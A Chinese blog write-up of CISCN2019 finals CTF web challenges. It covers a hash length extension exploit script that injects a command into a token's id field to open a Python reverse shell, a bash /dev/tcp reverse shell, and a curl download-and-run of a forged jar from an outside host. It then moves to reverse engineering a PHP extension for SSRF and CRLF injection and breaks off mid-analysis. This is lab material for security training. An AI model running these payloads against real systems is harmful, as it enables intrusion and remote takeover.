<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>CISCN2019 总决赛复现 - LionTree</title>
  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=writeup>
  
  
  
    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">LionTree</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/summary" class="menu-item-link">Summary</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
        <li class="menu-item">
          <a href="/atom.xml" class="menu-item-link">RSS</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">CISCN2019 总决赛复现</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Homebrew-Dubbo"><span class="toc-text">Homebrew Dubbo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息泄露得到源码"><span class="toc-text">信息泄露得到源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#哈希拓展攻击命令执行"><span class="toc-text">哈希拓展攻击命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#伪造消费者得到flag"><span class="toc-text">伪造消费者得到flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Markdown-Note"><span class="toc-text">Markdown Note</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ida初步分析"><span class="toc-text">ida初步分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pmark-include"><span class="toc-text">pmark_include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zm-activate-pmarkdown"><span class="toc-text">zm_activate_pmarkdown</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试环境搭建"><span class="toc-text">调试环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试分析"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF注入"><span class="toc-text">CRLF注入</span></a></li></ol></li></ol>

  <div class="post-content">
    <p>去年直接就地爆炸，一年过去了还是没啥区别…</p>
<h1 id="Homebrew-Dubbo"><a href="#Homebrew-Dubbo" class="headerlink" title="Homebrew Dubbo"></a>Homebrew Dubbo</h1><p>一个网盘的功能，上传文件会返回一个token，比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzaWduIjoiWlRsaFptVmpZakUxTkRBeU5ERmtaV0ZqTlRrNE5HTXhORFF3TjJObE5UQT0iLCJpZCI6IllUWmxNREE1TW1VdE9EWTFOQzAwWVdZM0xUZzFZVFl0TjJKak9ETXhORFZsTTJJeSJ9</span><br></pre></td></tr></table></figure>

<p>base64解码为</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"sign"</span>:<span class="string">"ZTlhZmVjYjE1NDAyNDFkZWFjNTk4NGMxNDQwN2NlNTA="</span>,<span class="attr">"id"</span>:<span class="string">"YTZlMDA5MmUtODY1NC00YWY3LTg1YTYtN2JjODMxNDVlM2Iy"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到分为<code>sign</code>和<code>id</code>两部分，使用token可以下载上传的文件</p>
<h2 id="信息泄露得到源码"><a href="#信息泄露得到源码" class="headerlink" title="信息泄露得到源码"></a>信息泄露得到源码</h2><p>没啥思路，可以先做下信息搜集</p>
<p>在<code>/static/js/app.4d269ccff489d8a081d1.js</code>里有一个注释</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//# sourceMappingURL=app.4d269ccff489d8a081d1.js.map</span></span><br></pre></td></tr></table></figure>

<p>下载<code>/static/js/app.4d269ccff489d8a081d1.js.map</code>，用<a href="https://github.com/GerbenJavado/LinkFinder" target="_blank" rel="noopener">LinkFinder</a>找到一个接口</p>
<p><img src="/images/%E6%8E%A5%E5%8F%A3.JPG" alt=""></p>
<p>访问<code>/api/upload/list</code>发现列出了存在的<code>token</code></p>
<p><img src="/images/upload_list.JPG" alt=""></p>
<p>使用第一个token可以下载得到源码</p>
<h2 id="哈希拓展攻击命令执行"><a href="#哈希拓展攻击命令执行" class="headerlink" title="哈希拓展攻击命令执行"></a>哈希拓展攻击命令执行</h2><p>审计下代码发现是一个java微服务的架构</p>
<p><img src="/images/Homebrew_Dubbo.JPG" alt=""></p>
<p>在<code>in.zhaoj.homebrew_dubbo.storage_provider.service.Impl.StorageServiceImpl</code>的<code>readFile</code>方法可以发现可控的命令执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HashMap&lt;String, Object&gt; <span class="title">readFile</span><span class="params">(HashMap&lt;String, Object&gt; parameter)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;String, Object&gt; returnHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        String id = ((String)(parameter.get(<span class="string">"id"</span>)));</span><br><span class="line">        String dictName = String.valueOf(UUID.randomUUID());</span><br><span class="line"></span><br><span class="line">        shellUtil.exec(<span class="string">"cd "</span> + uploadFolder + <span class="string">" &amp;&amp; unzip "</span> + id + <span class="string">".zip -d "</span> + tmpPath + <span class="string">"/"</span> + dictName + <span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        fileUtil.list(<span class="keyword">new</span> File(tmpPath + <span class="string">"/"</span> + dictName + <span class="string">"/"</span>), result);</span><br><span class="line">        String[] fileNames = result.get(<span class="number">0</span>).split(<span class="string">"/"</span>);</span><br><span class="line">        returnHashMap.put(<span class="string">"filename"</span>, fileNames[fileNames.length - <span class="number">1</span>]);</span><br><span class="line">        returnHashMap.put(<span class="string">"dictname"</span>, dictName);</span><br><span class="line">        returnHashMap.put(<span class="string">"size"</span>, <span class="keyword">new</span> File(tmpPath + <span class="string">"/"</span> + dictName + <span class="string">"/"</span> + fileNames[fileNames.length - <span class="number">1</span>]).length());</span><br><span class="line">        returnHashMap.put(<span class="string">"url"</span>, <span class="string">"http://"</span> + host + <span class="string">":"</span> + port + <span class="string">"/"</span> + staticAccessPath.replace(<span class="string">"**"</span>, <span class="string">""</span>) + <span class="string">"/"</span> + dictName + <span class="string">"/"</span> + fileNames[fileNames.length - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        shellUtil.exec( <span class="string">"rm -rf "</span> + uploadFolder + <span class="string">"/"</span> + dictName + <span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> returnHashMap;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellUtil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">exec</span><span class="params">(String shell)</span> </span>&#123;</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        Process process;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 避免文件名中的特殊字符导致命令出错</span></span><br><span class="line">            shell = shell.replace(<span class="string">"\u0000"</span>, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">            process = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, shell&#125;);</span><br><span class="line">            process.waitFor();</span><br><span class="line">            BufferedReader read = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = read.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                result+=line;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过首先要在前端消费者<code>frontend_consumer</code>那里绕过<code>token</code>的验证</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(value = <span class="string">""</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity&lt;Resource&gt; <span class="title">download</span><span class="params">(@RequestParam String token)</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] id = fileSignUtil.verifyToken(token); <span class="comment">//会先对token进行验证</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(id == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.notFound().build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; requestHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        requestHashMap.put(<span class="string">"id"</span>, <span class="keyword">new</span> String(id));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; returnHashMap = <span class="keyword">this</span>.dubboCallUtil.callWithRetry(<span class="string">"in.zhaoj.homebrew_dubbo.storage_provider.service.StorageService"</span>, <span class="string">"readFile"</span>, requestHashMap);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>验证方法是对<code>id</code>进行签名，看其是否与<code>token</code>相同。获取签名时可以哈希拓展攻击</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getSign</span><span class="params">(<span class="keyword">byte</span>[] filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> base64Util.encode(encrypt(arrayUnion(secretKey.getBytes(), filename)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为每次file.sign_key都会变，随意sign和id要换成自己的</span></span><br><span class="line">sign = <span class="string">"1b929a91319bcc3221e09fb3c78a4c80"</span></span><br><span class="line">id = <span class="string">"3221a5e3-f3b8-42b7-9e03-5a4f9439e1f8"</span></span><br><span class="line">cmd = <span class="string">''';python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("174.0.64.30",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';'''</span></span><br><span class="line">sign,id = hashpumpy.hashpump(sign,id,cmd,<span class="number">32</span>)</span><br><span class="line">print(sign)</span><br><span class="line">print(id)</span><br><span class="line">token = <span class="string">b'&#123;"sign":"'</span>+ base64.b64encode(sign.encode()) + <span class="string">b'","id":"'</span> + base64.b64encode(id) + <span class="string">b'"&#125;'</span></span><br><span class="line">token = base64.b64encode(token)</span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://5f27951f-6e8b-42b6-abe9-916b116ee976.node3.buuoj.cn/api/upload?token='</span></span><br><span class="line">requests.get(url=url+token.decode())</span><br></pre></td></tr></table></figure>

<p>这里用<code>/bin/bash</code>等方式死活弹不了shell，只有python3能成功</p>
<p>拿到shell后发现这里<code>/bin/sh</code>指向的是<code>dash</code>，常用的反弹shell方法里很多语法<code>dash</code>都不支持，目前也没有找到<code>dash</code>弹shell的方法…</p>
<p>替代办法是<code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/174.0.64.3/8080 0&gt;&amp;1&#39;</code></p>
<h2 id="伪造消费者得到flag"><a href="#伪造消费者得到flag" class="headerlink" title="伪造消费者得到flag"></a>伪造消费者得到flag</h2><p>此时的用户是java3，但flag只有java2用户才能读</p>
<p>用java2启动的服务是<code>flag_provider</code>，里面有方法可以读flag</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlagServiceImpl</span> <span class="keyword">implements</span> <span class="title">FlagService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HashMap&lt;String, Object&gt; <span class="title">getFlag</span><span class="params">(HashMap&lt;String, Object&gt; parameter)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;String, Object&gt; returnHashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"/flag"</span>);</span><br><span class="line">            String data = IOUtils.toString(fis, <span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line">            returnHashmap.put(<span class="string">"flag"</span>, data);</span><br><span class="line">            <span class="keyword">return</span> returnHashmap;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> returnHashmap;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>frontend_consumer</code>中并没有没有调用这个方法的地方，但我们可以伪造一个自己的<br><code>frontend_consumer</code>传上去运行，在里面远程调用<code>getFlag</code>方法</p>
<ul>
<li>首先修改没用的<code>/api/check</code>接口</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/api/check"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DubboCallUtil dubboCallUtil;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(value = <span class="string">""</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseData <span class="title">show</span><span class="params">()</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line"><span class="comment">//        return new ResponseData(ResponseData.CODE_SUCCESS, dubboCallUtil.getAllNodes());</span></span><br><span class="line">        HashMap&lt;String,Object&gt; parameter = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        HashMap&lt;String, Object&gt; returnHashMap = <span class="keyword">this</span>.dubboCallUtil.callWithRetry(<span class="string">"in.zhaoj.homebrew_dubbo.flag_provider.service.FlagService"</span>, <span class="string">"getFlag"</span>, parameter);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ResponseData(ResponseData.CODE_SUCCESS,returnHashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>application-prod.properties</code>中修改监听的端口</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server.address=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="comment">#server.port=8080</span></span><br><span class="line">server.port=<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<ul>
<li>构建jar包</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package</span><br></pre></td></tr></table></figure>

<ul>
<li>利用反弹shell把jar包下到靶机上，然后运行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://174.0.64.30:5000/frontend_consumer.jar -o frontend_consumer.jar</span><br><span class="line">nohup java -jar frontend_consumer.jar &gt; nohup.txt &amp;</span><br></pre></td></tr></table></figure>

<ul>
<li>访问伪造的<code>frontend_consumer</code>的<code>/api/check</code>接口得到flag</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:1234/api/check</span><br></pre></td></tr></table></figure>

<p><img src="/images/get_flag.JPG" alt=""></p>
<p>赵总nb!</p>
<h1 id="Markdown-Note"><a href="#Markdown-Note" class="headerlink" title="Markdown Note"></a>Markdown Note</h1><p>传说中的<del>web</del> re</p>
<p>思路很明确，从<code>pmarkdown.so</code>这个php拓展里找一个ssrf然后文件上传</p>
<p>可以先看看evoa师傅的文章学习下php拓展的基础知识:</p>
<ul>
<li><p><a href="https://evoa.me/archives/10/" target="_blank" rel="noopener">PHP 拓展学习 &amp; 逆向拓展So文件 (一)</a></p>
</li>
<li><p><a href="https://evoa.me/archives/11/" target="_blank" rel="noopener">PHP 拓展学习 &amp; 逆向拓展So文件 (二)</a></p>
</li>
</ul>
<h2 id="ida初步分析"><a href="#ida初步分析" class="headerlink" title="ida初步分析"></a>ida初步分析</h2><h3 id="pmark-include"><a href="#pmark-include" class="headerlink" title="pmark_include"></a>pmark_include</h3><p><code>post.php</code>里调用了一个<code>pmark_include</code>来渲染markdown文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pmark_include(<span class="string">'posts/'</span>.$_GET[<span class="string">'md'</span>]);</span><br></pre></td></tr></table></figure>

<p>在<code>pmarkdown.so</code>的导出函数中可以找到<code>pmark_include</code>（拓展中叫做<code>zif_pmark_include</code>）</p>
<p><img src="/images/pmarkdown_export.JPG" alt=""></p>
<p>跟进去看一下，最终跟到<code>verbose_pandoc_file</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">verbose_pandoc_file</span><span class="params">(<span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__pid_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v2; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">int</span> fd[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-2830h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10240</span>]; <span class="comment">// [rsp+10h] [rbp-2828h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+2818h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x2800</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( pipe(fd) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v1 = fork();</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">close</span>(fd[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( fd[<span class="number">1</span>] == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> -(execl(path, <span class="string">"pandoc"</span>, filename, <span class="number">0L</span>L) == <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dup2(fd[<span class="number">1</span>], <span class="number">1</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">close</span>(fd[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">return</span> -(execl(path, <span class="string">"pandoc"</span>, filename, <span class="number">0L</span>L) == <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">close</span>(fd[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)<span class="built_in">read</span>(fd[<span class="number">0</span>], buf, <span class="number">0x2800</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, buf);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x2800</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">close</span>(fd[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> -(waitpid(v2, <span class="number">0L</span>L, <span class="number">0</span>) &gt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里用<code>execl</code>函数来调用<code>pandoc</code>渲染markdown文件，并不存在命令注入</p>
<h3 id="zm-activate-pmarkdown"><a href="#zm-activate-pmarkdown" class="headerlink" title="zm_activate_pmarkdown"></a>zm_activate_pmarkdown</h3><p>php拓展中的<code>PHP_RINIT_FUNCTION</code>函数（宏展开后实际上是<code>zm_activate_##module(...){...}</code>）会在请求到来时执行，很可能藏有一些东西</p>
<ul>
<li>在ida的Exports中找到<code>pmarkdown_module_entry</code>，在里面可以找到<code>zm_activate_pmarkdown</code>函数</li>
</ul>
<p><img src="/images/zm_activate_pmarkdown.JPG" alt=""></p>
<ul>
<li>在<code>zm_activate_pmarkdown</code>底部调用了一个<code>unk_1850</code></li>
</ul>
<p><img src="/images/post_debug.JPG" alt=""></p>
<ul>
<li>跟进<code>unk_1850</code>函数就可以找到ssrf，并且通过<code>path</code>可以CRLF注入构造文件上传的包</li>
</ul>
<p><img src="/images/pmarkdown_ssrf.JPG" alt=""></p>
<p>那么接下来的问题就是如何才能控制<code>path</code>。回过头来再看<code>zm_activate_pmarkdown</code>底部的代码</p>
<ul>
<li>修改了变量名并添加了一些注释的c代码</li>
</ul>
<p><img src="/images/post_debug2.JPG" alt=""></p>
<ul>
<li>对应的汇编：</li>
</ul>
<p><img src="/images/post_debug3.JPG" alt=""></p>
<p><code>zend_hash_find</code>用于获取一个哈希表中的键值，其第一个参数为指向<code>HashTable</code>的指针，第二个参数为一个<code>zend_string</code>。可以看出：</p>
<ul>
<li><p><code>key</code>的内容是<code>&#39;debug&#39;</code></p>
</li>
<li><p><code>ht</code>是通过<code>core_globals</code>加偏移获得。<code>core_globals</code>是php中的一个结构体，因此<code>ht</code>可能是其中的某个成员</p>
</li>
</ul>
<p>具体是哪个成员呢…直接用偏移地址和<code>core_globals</code>成员大小去算感觉很麻烦，还是gdb动调去看一看</p>
<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>使用的调试方法来自<a href="https://www.anquanke.com/post/id/204404#h2-5" target="_blank" rel="noopener">WEBPWN入门级调试讲解</a>，通过php cli进行调试</p>
<ul>
<li>在php cli的php.ini中添加<code>pmarkdown.so</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension = <span class="string">"/home/kali/pmarkdown/pmarkdown.so"</span></span><br></pre></td></tr></table></figure>

<ul>
<li>写个测试的php文件，运行不报错即可</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">pmark_include(<span class="string">'test.md'</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<a href="https://www.anquanke.com/post/id/204404#h2-5" target="_blank" rel="noopener">WEBPWN入门级调试讲解</a>的方法，断在<code>zm_activate_pmarkdown</code></li>
</ul>
<p><img src="/images/vmmap.JPG" alt=""></p>
<p><img src="/images/break.JPG" alt=""></p>
<p>这里要注意下php版本的问题，一开始用的php7.4会报错：</p>
<p><img src="/images/php_extension_error.JPG" alt=""></p>
<p>这是因为<code>pmarkdown.so</code>是在php7.2环境下编译的(API=20170718)，与其他版本的API可能不兼容</p>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>再下一个断点，断在<code>zm_activate_pmarkdown</code>最后的<code>call    _zend_hash_find</code></p>
<p><img src="/images/zend_hash_find.jpg" alt=""></p>
<p>可以看到<code>ht</code>和<code>key</code>两个参数</p>
<ul>
<li>先确认下<code>key</code></li>
</ul>
<p><img src="/images/key.JPG" alt=""></p>
<p>看着没啥问题，正好对应于<code>zend_string</code></p>
